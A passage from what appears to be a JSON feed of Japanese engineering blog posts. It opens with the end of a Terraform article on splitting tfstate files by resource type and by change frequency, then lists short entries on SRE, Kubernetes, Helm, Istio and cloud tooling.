(Webサーバー、Appサーバー系)auth (認証/認可系)datastore (DBサーバー系)cicd (CI/CD系)monitor (監視系)network (ネットワーク系)ここで仮定した状況では、各プロダクトのtfstateファイルの依存は一方向最終的に、networkグループやauthグループの tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: AWSリソースの種類グループ別---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            application[\\"application-tfstate<br>例: ALB, API Gateway, CloudFront, EC2, ECS, EKS, SNS, など\\"]            auth[\\"auth-tfstate<br>例: IAM, など\\"]            cicd[\\"cicd-tfstate<br>例: Code3兄弟, など\\"]            monitor[\\"monitor-tfstate<br>例: CloudWatch, など\\"]            network[\\"network-tfstate<br>例: Route53, VPC, など\\"]            datastore[\\"datastore-tfstate<br>例: ElastiCache, RDS, S3, など\\"]            application-....->auth            application-..->datastore            application-...->network            cicd-..->application            datastore-..->network            monitor-..->application            monitor-..->datastore       end    subgraph stg-bucket        stg[\\"tfstate\\"]    end    subgraph prd-bucket        prd[\\"tfstate\\"]    end    end【種類グループ別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合AWSリソースの種類グループ別の分割パターンの場合、異なるリポジトリで管理するとリポジトリが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリポジトリの場合この場合では、AWSリソースの種類グループ別に分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-repository/├── \uD83D\uDCC2 application/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── alb.tf│    ├── api_gateway.tf│    ├── cloudfront.tf│    ├── ec2.tf│    ├── ecs.tf│    ├── eks.tf│    ├── ses.tf│    ├── sns.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 auth/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── iam.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 cicd/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── codebuild.tf│    ├── codecommit.tf│    ├── codedeploy.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # cicdコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # cicdコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # cicdコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 datastore/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── elasticache.tf│    ├── rds.tf│    ├── s3.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # datastoreコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # datastoreコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # datastoreコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 monitor/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── cloudwatch.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 network      ├── provider.tf      ├── output.tf # 他の tfstate ファイルから参照できるように、outputブロックを定義する      ├── route53.tf      ├── vpc.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境           ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する           ...【種類グループ別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合AWSリソースの種類グループ別の分割パターンの場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、AWSリソースの種類グループ別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 application│    └── terraform.tfstate # applicationコンポーネントの状態を持つ│├── \uD83D\uDCC2 auth│    └── terraform.tfstate # authコンポーネントの状態を持つ│├── \uD83D\uDCC2 cicd│    └── terraform.tfstate # cicdコンポーネントの状態を持つ│├── \uD83D\uDCC2 datastore│    └── terraform.tfstate # datastoreコンポーネントの状態を持つ│├── \uD83D\uDCC2 monitor│    └── terraform.tfstate # monitorコンポーネントの状態を持つ│└── \uD83D\uDCC2 network      └── terraform.tfstate # networkコンポーネントの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...AWSリソースの状態の変更頻度グループ別この分割方法についてAWSリソースの状態の変更頻度グループ別でtfstateファイルを分割し、中間層もこれに基づいて設計します。この分割方法により、各変更頻度グループの管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。https://www.reddit.com/r/Terraform/comments/126jwa1/comment/jea9bjk/?utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button▶ おすすめ度について【変更頻度グループ別】状態の依存関係図例えば、以下の変更頻度グループに分割した状況と仮定します。変更高頻度グループ変更中頻度グループ変更低頻度グループここで仮定した状況では、各プロダクトのtfstateファイルの依存は一方向最終的に、変更低頻度グループの tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: AWSリソースの状態の変更頻度グループ別---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            high[\\"high-freq-tfstate<br>例: API Gateway, CloudFront, CloudWatch, IAM\\"]            middle[\\"middle-freq-tfstate<br>例: ALB, EC2, ECS, EKS, ElastiCache, RDS, S3, SES, SNS\\"]            low[\\"low-freq-tfstate<br>例: Route53, VPC\\"]            high-...->low            middle-..->low        end    subgraph stg-bucket        stg[\\"tfstate\\"]    end    subgraph prd-bucket        prd[\\"tfstate\\"]    end    end【変更頻度グループ別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合AWSリソースの変更頻度グループ別の分割パターンの場合、異なるリポジトリで管理するとリポジトリが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリポジトリの場合この場合では、AWSリソースの変更頻度グループ別に分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-repository/├── \uD83D\uDCC2 high-freq # 高頻度変更グループ│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── api_gateway.tf│    ├── cloudfront.tf│    ├── cloudwatch.tf│    ├── ec2.tf│    ├── ecs.tf│    ├── eks.tf│    ├── iam.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # high-freqコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # high-freqコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # high-freqコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 low-freq # 低頻度変更グループ│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── route53.tf│    ├── vpc.tf│    ├── \uD83D\uDCC2 tes│    │    ├── backend.tfvars # low-freqコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg│    │    ├── backend.tfvars # low-freqコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd│          ├── backend.tfvars # low-freqコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 middle-freq # 中頻度変更グループ (高頻度とも低頻度とも言えないリソース)      ├── provider.tf      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── elasticache.tf      ├── rds.tf      ├── s3.tf      ├── ses.tf      ├── \uD83D\uDCC2 tes      │    ├── backend.tfvars # middle-freqコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg      │    ├── backend.tfvars # middle-freqコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd           ├── backend.tfvars # middle-freqコンポーネントの状態を持つ tfstate ファイルを指定する           ...【変更頻度グループ別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合AWSリソースの変更頻度グループ別の分割パターンの場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、AWSリソースの変更頻度グループ別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 high-freq│    └── terraform.tfstate # high-freqコンポーネントの状態を持つ│├── \uD83D\uDCC2 middle-freq│    └── terraform.tfstate # middle-freqコンポーネントの状態を持つ│└── \uD83D\uDCC2 low-freq      └── terraform.tfstate # low-freqコンポーネントの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...10. おわりにTerraformのtfstateファイルの分割パターンをもりもり布教しました。ぜひ採用してみたい分割パターンはあったでしょうか。Terraformの開発現場の具体的な要件は千差万別であり、特にtfstateファイル間の状態の依存関係は様々です。もし、この記事を参考に設計してくださる方は、分割パターンを現場に落とし込んで解釈いただけると幸いです\uD83D\uDE47\uD83C\uDFFB‍「自分を信じても…信頼に足る仲間を信じても…誰にもわからない…」(お友達の@nwiizo, 2023, Terraform Modules で再利用できるので最高ではないでしょうか？)謝辞今回、Terraformの分割パターンの収集にあたり、以下の方々からの意見・実装方法も参考にさせていただきました。@kiyo_12_07 さん@masasuzu さん@tozastation さん(アルファベット順)この場で感謝申し上げます\uD83D\uDE47\uD83C\uDFFB‍記事関連のおすすめ書籍Terraform in Action (English Edition)作者:Winkler, ScottManningAmazonTerraform: Up & Running; Writing Infrastructure As Code作者:Brikman, YevgeniyOreilly & Associates IncAmazon","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/07/05/001756","isoDate":"2023-07-04T15:17:56.000Z","dateMiliSeconds":1688483876000,"authorName":"Hiroki Hasegawa","authorId":"hiroki-hasegawa"},{"title":"光に負けルナ~Google Cloudでのマルチリージョンデータベースについて~","contentSnippet":"クラウドを利用する一番のメリットの一つとしてオンデマンドでリソースを調達し、アクセス負荷に応じてスケールイン・アウト出来ることが上げられます。そのため大体のアプリケーションではシングルリージョンまたは隣接するリージョン2~3程度で運用を始めることが多いと思います。(日本の場合asia-northeast-1とasia-northeast-2など)アプリケーションがグローバルに拡大すると、それだけ物理的な距離が広がりユーザ・サーバ間のアクセスにかかる時間が拡大します。例えばユーザ・サーバ共に日本にある場合(沖縄・北海道間約3,000km)、ネットワークによる遅延は片道約15ms以下...","link":"https://zenn.dev/nnaka2992/articles/to_beat_light_speed_on_google_cloud_databases","isoDate":"2023-07-03T15:39:08.000Z","dateMiliSeconds":1688398748000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"スリーシェイクに入社しました！","link":"https://bells17.medium.com/3-shake-279ea982b977?source=rss-713cf42ce34d------2","isoDate":"2023-07-03T14:10:50.000Z","dateMiliSeconds":1688393450000,"authorName":"bells17","authorId":"bells17"},{"title":"SREの専門家が集まったチームで『SREの探求』の社内輪読会を完遂しました。","contentSnippet":"\uD83C\uDF61 前回の記事syu-m-5151.hatenablog.com\uD83D\uDC36 はじめにこんにちは。株式会社スリーシェイク Sreake 事業部に所属している@nwiizo です。Sreake事業部は技術力が求められる領域で豊富な経験を持つSREの専門家が集まったチームです。事業部にはさまざまな背景を持つSREの専門家が多く在籍してます。しかし、そのSREの専門家達とは案件が一緒にならなかったり、能動的に質問をしなければSREに関する意見や知見を聞けませんでした。SREの探求 ―様々な企業におけるサイトリライアビリティエンジニアリングの導入と実践オライリージャパンAmazonそんな、課題がある中で半年前に各案件で得た知見や経験を各メンバーで出し合える会がもっと(社内で技術共有会はあるため)あると良いと思いました。そこで社内チャットで有志を募り 『輪読会について考える会』を行いました。社内チャットで運営を募ると一瞬で集まったので良い組織だと思いました。※『輪読会の各話』の議事録が見れるTOPページです。\uD83D\uDC35 各メンバーの感想と今後のアクションsugoude途中からの参加でしたが、楽しく役立つ輪読会でした。特に16章17章はDBREに関する内容でしたので当事者意識を持って参加し、有意義な時間になりました。個人的には、途中からの参加でしたので、SREの探求を再演してもらえたら嬉しいです。hash_gen選定理由としてみんなSRE本は読んでるだろうという点もあったと思いますが、様々なケースと向き合ってきたSreake事業がある3-shakeだからこそSREの探求を輪読する価値があったと思いました。様々な事例に対して我々の場合はどうやって提案していけばよいかという会話が多かったことが印象に残っています。日々のアウトプットでも技術フォーカスの内容に加えて具体的な経験例を社内に積極的にフィードバックしていくことでこのいい習慣を続けていけたらと思っています。SatohJohn入社してまもなくというのも有り、そこまでSREの用語に対して詳しくなかったため、この本を読むことで、どうしてそれらの用語が必要なのかが深掘りできたきがしました。また、個人的にGoogle CloudのDevOpsの試験を受けることが有り、その際にもこの本での話題が役に立ちました。今後アプリケーション開発にSREの考えを入れられるようにするのに、ちょうどよい粒度だったと感じております。tozastationインターンの方が参加したタイミングだけ出れたのでそのエピソードで...! Sreake 事業部だけでなく、他事業部も巻き込んで開催していたのが素敵だなと思いました。Sreake の仕事を知ってもらうであったり、他事業部にも SRE を取り込んでもらうなどさまざまな意見交換が生まれる場だったじゃないかと思います。インターンの方も声を上げてくれたのがさらに良かったです！次のテーマも応援してます！nnaka2992DBRE兼SRE見習いとしてSRE活動をしている自分にとっては、データベース以外でのSREの取り組みを技術・ヒューマンスキル両方の面から学べる本でした。弊社のような不特定多数の組織に対するSREの導入サポートを行う企業では、それぞれの組織に合わせたSREの適用が必要となります。様々なSRE実践例を扱う本書籍は自分の知見を深める面でも、SREとしての引き出しを増やす面でも素晴らしい書籍でした。今後はあくまでこの書籍はある組織での最適解としてリファレンスしながら、それぞれの組織で最適となるSREの探求を続けられればと思います。とあるメンバーすごい有意義な時間でした。Sreake内で自分は人数も組織も大きな組織でどうやって既存の組織にSREを導入するか？を考えているので、様々なプラクティスを知れたのは良い体験でした。輪読で学んだことをお客様に話すと「なるほど！」と言ってもらえることも多々ありました。\uD83D\uDC26 まとめ今回の読書会は、新しい知識共有のコミュニティーを作り上げながら実施しました。毎週1回、定められた時間にオンラインに集まり、担当者が1章ずつ読みまとめ、それについて話し合うのです。そして、その議論の過程をドキュメントに記録し、印象に残った部分をいつでも見返せるように保存しておけます。感想はもちろん、一人一人異なりますが、それぞれが課題や組織に向かって解決策を考えていくのがとても面白かったです。その結果、同じ本を読んでいても、それぞれ異なるアクションを考え出すことができました。このようなコミュニティを活用した議論と輪読により、活発な意見交換をしながら特殊なミームが発生したり楽しく読書を進めることができました。これからも、このスタイルの読書会は続けていく予定です。皆さんも、一緒に働くメンバーと読書会を試してみてはいかがでしょうか？新たな知識共有の体験、その刺激を味わってほしいです。弊社の採用サイトも載せておきますjobs-3-shake.com","link":"https://syu-m-5151.hatenablog.com/entry/2023/07/03/094713","isoDate":"2023-07-03T00:47:13.000Z","dateMiliSeconds":1688345233000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Copilotでらくらくコードリーディング","contentSnippet":"GitHub Copilot便利ですね。2021年にTechnical Previewとして発表された時から便利だ便利だと言われていたGitHub Copilotに、2023年の4月末ごろからデビューしました。デビューしたは良いものの最近は仕事ではコーディングよりアーキテクト的な方面でのお仕事が多かったり、個人の時間でもコーディングするよりOSSのコードを読むことのほうが多くコーディングのアシスタントツールとしては使いこなせていません。そのため最近はPostgreSQLのコードを読むときのアシスタントとして利用することが多いです。なのでこの記事ではCopilotでコードリーディン...","link":"https://zenn.dev/nnaka2992/articles/code_reading_with_copilot","isoDate":"2023-06-28T14:41:21.000Z","dateMiliSeconds":1687963281000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Cloud RunのSidecarでJVMのmetricsの取得してみた","contentSnippet":"概要Cloud Runのmetricsをデフォルトで取得している指標(metrics)以外の指標が他に欲しい場合、どうするのが良いのかを考えてみました。ちょうどCloud RunのSidecar機能がでたので、それを使います。他の指標を、ここではJVMのmetricsとします。Cloud Run上のJVMのmetricsが取れて何が嬉しいのかについては、一旦考えません。後にCloud Runの最大起動時間が増えた場合は、意味があるかもしれません。 構成図にすると以下のような感じになります。Cloud RunでSpring Bootアプリケーションを立ち上げClou...","link":"https://zenn.dev/satohjohn/articles/25bc5879de7832","isoDate":"2023-06-28T12:03:00.000Z","dateMiliSeconds":1687953780000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"ロクに勉強してこなかったエンジニアが輪読会参加とかPCA受験に向けて勉強とかしてみた話","contentSnippet":"この記事について40歳でフリーランスから転職をきっかけに会社員エンジニアになって、社内のエンジニアの熱意に影響を受けて勉強をはじめてみた中年エンジニアの感想とか気づきとかです。先に結論勉強する…","link":"https://qiita.com/bayobayo0324/items/56f93f50fa0115dc4d6d","isoDate":"2023-06-27T12:31:17.000Z","dateMiliSeconds":1687869077000,"authorName":"bayobayo0324","authorId":"bayobayo0324"},{"title":"PagerDutyがたくさん機能追加しているみたいなのでまとめてみた","contentSnippet":"はじめに PagerDutyはインシデントの管理、オンコール通知のサービスとして、とても優秀なサービスです。直近も、様々な新機能が出ていますが、旧機能から新機能への移行も同時に行われています。 弊社では、PagerDut […]The post PagerDutyがたくさん機能追加しているみたいなのでまとめてみた first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/pagerduty-release-updates/","isoDate":"2023-06-27T06:38:36.000Z","dateMiliSeconds":1687847916000,"authorName":"Sreake","authorId":"Sreake"},{"title":"やさしいERC20開発","contentSnippet":"https://cryptocurrency.connpass.com/event/287311/\\r\\rEthereumスマートコントラクトライブラリ「OpenZeppelin」を用いてERC20コントラクトをSepolia Testnetにデプロイし、基本的な操作を体験していただけます。\\r\\rRemixを使用し、OpenZeppelinを用いて基本的な送金、EOAへの委任と、\\rコントラクトへ委任し、ETHを送るとERC20が送金される自動販売機のようなスマートコントラクトの実装を行います。","link":"https://speakerdeck.com/shukob/yasasiierc20kai-fa","isoDate":"2023-06-23T04:00:00.000Z","dateMiliSeconds":1687492800000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Terraformで実践するAWS IAM Identity Center（AWS Single Sign-On）のユーザー管理戦略","contentSnippet":"はじめにAWS IAM Identity Center（AWS Single Sign-On）を使用して、ユーザー管理を考えていく上で、Terraformを使用して構成管理を実現しようと思います。作成したコードはgithub上に上がっているので、ご参考ください…","link":"https://qiita.com/yokoo-an209/items/569ac1ba517b076e8cde","isoDate":"2023-06-21T04:05:23.000Z","dateMiliSeconds":1687320323000,"authorName":"Annosuke Yokoo","authorId":"yokoo-an209"},{"title":"アプリ開発者のための kubectl 講座","contentSnippet":"これは何Kubernetes クラスタ管理者とアプリケーション開発者が分業しているプロジェクトで，開発者が必ずしも Kubernetes に詳しくない場合を想定し，開発時に使いそうな kubectl のコマンドをまとめたものです。クラスタ管理者から開発者にこのドキュメントを適宜改変して渡し，開発者がある程度自立して操作できるようになることで，管理者への問い合わせ負荷を減らすのが狙いです。場合によってはハンズオンで講座を開いてもよいでしょう。 ドキュメント案ここでは Amazon EKS でクラスタを構築する場合の例を示します。別のインフラに構築している場合は適宜書き換え...","link":"https://zenn.dev/toshikish/articles/6a06017747cbba","isoDate":"2023-06-19T06:03:18.000Z","dateMiliSeconds":1687154598000,"authorName":"toshikish","authorId":"toshikish"},{"title":"夏に向けて、体もコンテナイメージも減量（軽量化）させよう！","contentSnippet":"はじめにdockerで構築しているNext.jsのフロントエンドアプリケーションのimageをAmazon ECRにpushしようとしたときに、pushのあまりの遅さにびっくりしたのがことの発端で…","link":"https://qiita.com/yokoo-an209/items/0297808af40c1a74928e","isoDate":"2023-06-19T02:46:48.000Z","dateMiliSeconds":1687142808000,"authorName":"Annosuke Yokoo","authorId":"yokoo-an209"},{"title":"Terraform 静的検査ツール比較","contentSnippet":"対象tfsectflintKICSCheckovSnyk tfsechttps://github.com/aquasecurity/tfsechttps://aquasecurity.github.io/tfsec/v1.28.1 特徴CI系公式のdocker imageがあるhttps://github.com/aquasecurity/tfsec#use-with-dockerGitHub Actionがあるhttps://github.com/aquasecurity/tfsec-pr-commenter-actionGitH...","link":"https://zenn.dev/tayusa/articles/9829faf765ab67","isoDate":"2023-06-15T17:00:00.000Z","dateMiliSeconds":1686848400000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"editcap で tcpdump のキャプチャファイルから指定の時間帯を切り出す","contentSnippet":"ちょっと大きめ (時間範囲の広い) pcap ファイルがあって、wireshark で見るにしてもちょっと大きすぎるなということがありました。 見たい時間帯だけに絞ったファイル","link":"https://blog.1q77.com/2023/06/editcap/","isoDate":"2023-06-15T14:46:42.000Z","dateMiliSeconds":1686840402000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"GitHub の Reusable workflow で working-directory に変数を使う","contentSnippet":"やりたいことGitHub Actions の reusable workflow で，作業ディレクトリを入力変数で変えたい場合を考えます。on:  workflow_call:    inputs:      workdir:        required: true        type: string うまくいかない方法ワークフロー全体のステップのデフォルト設定 defaults.run.working-directory では，現時点ではコンテキストと式が許可されていません。したがって，入力変数でディレクトリ名を受け取って上記に入れても動作しません。...","link":"https://zenn.dev/toshikish/articles/be970407f02098","isoDate":"2023-06-15T05:22:24.000Z","dateMiliSeconds":1686806544000,"authorName":"toshikish","authorId":"toshikish"},{"title":"KubeconformをGitLab CIに組み込んで、k8sのマニフェストがAPIの仕様に沿うか検査する","contentSnippet":"はじめにk8sマニフェストを普段管理していないメンバーがマニフェストのファイルを変更する場面があります。その際のレビューを出来るだけ自動化したくkubeconformを導入しました。 KubeconformマニフェストがAPIの仕様に沿うか検査してくれます。https://github.com/yannh/kubeconform自分でスキーマを用意すればIstio、Argo Rollouts、Argo Workflowsのような外部のAPIも検査できます。 スキーマの生成スキーマの生成はpythonのスクリプトが用意されているので、これをCRDを引数で渡し実行しま...","link":"https://zenn.dev/tayusa/articles/1aa96e6ceb838a","isoDate":"2023-06-11T17:19:45.000Z","dateMiliSeconds":1686503985000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"plutoをGitLab CIに組み込んで非推奨のk8s apiVersionを検出する","contentSnippet":"はじめにk8sのバージョンが上がるとAPIが再編成されたりアップグレードされたりします。新しいAPIが出ると古いAPIは非推奨になり最終的には削除されます。なので、k8sのバージョンアップ時はDeprecated API Migration Guideなどを見て非推奨のapiVersionが使われていないか確認して時には修正する必要があります。https://kubernetes.io/docs/reference/using-api/deprecation-guide/例CronJob の batch/v1beta1 -> batch/v1 plutoplu...","link":"https://zenn.dev/tayusa/articles/79a3f54d8f21bc","isoDate":"2023-06-11T17:18:13.000Z","dateMiliSeconds":1686503893000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Istio Canary Upgrade by Helm","contentSnippet":"前提helmfileを利用istioのrevisionTagを利用関係のない設定は省略 Upgradeの前にInstall ディレクトリ構成├── helmfile_istio-base.yaml├── helmfile_istio-ingressgateway.yaml├── helmfile_istiod-1-16-0.yaml└── values    ├── istio-base.yaml    ├── istio-ingressgateway.yaml    └── istiod.yaml helmfile helmfile_isti...","link":"https://zenn.dev/tayusa/articles/03cf961e2409bd","isoDate":"2023-06-11T17:17:37.000Z","dateMiliSeconds":1686503857000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Helmに入門したので、躓いたところを振り返る","contentSnippet":"はじめにアプリのマニフェストを管理するのにKustomizeを使っていたのですが、同じようなマニフェストが乱立したので管理を楽にするためにHelmに移行しました。Helmを一から書いたのは初めてだったので、躓いた点をここに残します。 quote関数の進数変換0から始まる数値をquote関数を使って文字列にすると進数変換が起こり想定した値ではなくなる下記のようなtemplateでidとして0000000060のような値を渡すと、8進数として解釈され10進数である48に変換されてしまいます。...id: {{ .id | quote }}...0から始まる数値はtem...","link":"https://zenn.dev/tayusa/articles/e9285c6c4c09a1","isoDate":"2023-06-11T17:16:25.000Z","dateMiliSeconds":1686503785000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"ビットコイン・ブロックチェーン入門","contentSnippet":"https://cryptocurrency.connpass.com/event/286818/\\r初学者の方向けにビットコイン技術の全体像をお話ししました。","link":"https://speakerdeck.com/shukob/bitutokoinburotukutienru-men-40047fd3-985e-4c8f-b34b-1ea610be2535","isoDate":"2023-06-10T04:00:00.000Z","dateMiliSeconds":1686369600000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Go言語でNetlinkを少し触った話","contentSnippet":"Go言語でNetlinkを少し触ったのでメモ。具体的にはGo言語でNetlinkというネットワーク関連のライブラリを使ってStatic Routeを設定したりするサンプルを作ったりした。https://github.com/bells17/netlink-gosample Netlinkとは調べた範囲だと、Linuxカーネルのサブシステムの1つで、ルーティングテーブルの管理などのネットワーク関連の設定などを行う際に利用されるもの、という理解をしている。Netlinkは、Linuxカーネルとユーザ空間プロセス間の、またはカーネル内の通信を提供するためのIPC（Inter-pro...","link":"https://zenn.dev/bells17/articles/netlink-goexample","isoDate":"2023-06-08T18:03:10.000Z","dateMiliSeconds":1686247390000,"authorName":"bells17","authorId":"bells17"},{"title":"Kubernetes 1.27 以降のバッチ処理の改善","contentSnippet":"Kubernetes 1.27 以降で実装済みまたは予定されているバッチ処理の改善に繋がる KEP や Kubernetes のサブプロジェクトの現状を見ていきます。 KEP-3673: Kubelet limit of Parallel Image Pulls!Kubernetes 1.27 時点でアルファ機能です。1.28 でベータを目指していますが、設定はデフォルトで無効化されています。Pod の起動にノードのスケールアウトが必要な場合に、Pod の起動時間の短縮が期待できます。バッチ処理の Pod が一斉に起動するケースで恩恵を受けられそうです。Kubelet は...","link":"https://zenn.dev/toversus/articles/d6065bea460871","isoDate":"2023-06-08T03:46:32.000Z","dateMiliSeconds":1686195992000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"asdf の代わりに rtx を使う","contentSnippet":"nodeenv とか rbenv とか tfenv とか XXenv がそれぞれ .xxx-version というファイルにそのディレクトリ配下で使用する software の version を指定するという仕様があり、それらをまとめてやってくれる asdf というツールが登場","link":"https://blog.1q77.com/2023/06/rtx/","isoDate":"2023-06-07T01:25:11.000Z","dateMiliSeconds":1686101111000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"お前のパケットはもう死んでいる。TCPに死亡フラグを実装してみた","contentSnippet":"はじめにプロトコルの仕様などIETFが発行しているRFCにはジョークRFCというものが存在しています。伝書鳩でIP通信するとか、コーヒーポットを制御するなどが有名です。鳥類キャリアによるIPHyper Text Coffee Pot Control Protocol (HTCPCP/1.0) 日本語訳今年そんなジョークRFCに、TCPに死亡フラグを実装するというRFC9401が追加されました。The Addition of the Death (DTH) Flag to TCP 日本語訳この記事ではこのTCPに死亡フラグを実装するというRFC9401を真面目に実装してみ...","link":"https://zenn.dev/satoken/articles/golang-rfc9401","isoDate":"2023-06-07T00:32:17.000Z","dateMiliSeconds":1686097937000,"authorName":"satoken","authorId":"satoken"},{"title":"OpenAI API を利用して Terraform から構成図っぽい Mermaid 